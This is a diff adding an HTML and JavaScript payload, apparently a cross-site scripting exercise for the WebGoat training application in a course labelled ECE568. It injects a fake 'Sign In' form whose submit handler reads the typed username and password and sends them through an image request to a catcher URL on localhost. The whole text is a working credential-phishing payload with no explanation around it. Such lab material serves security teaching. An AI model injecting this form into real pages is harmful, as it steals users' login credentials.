@@ -1,0 +1,15 @@
+<script type="text/javascript">
+    function phish() {
+        var user = document.getElementById('ece568-2020-user').value;
+        var pass = document.getElementById('ece568-2020-pass').value;
+	var x = new Image();
+        x.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&phishUsername=" + user + "&phishPassword=" + pass;
+    }
+</script> 
+</form>
+<form id="ece568" method="post">
+    <h1>Sign In</h1><br> 
+    User Name:<input type="text" id="ece568-2020-user" value="" /><br> 
+    Password:<input type="password" id="ece568-2020-pass" value="" />
+    <input type="submit" id="ece568-2020-submit" onclick="phish()" value="login" />
+</form>
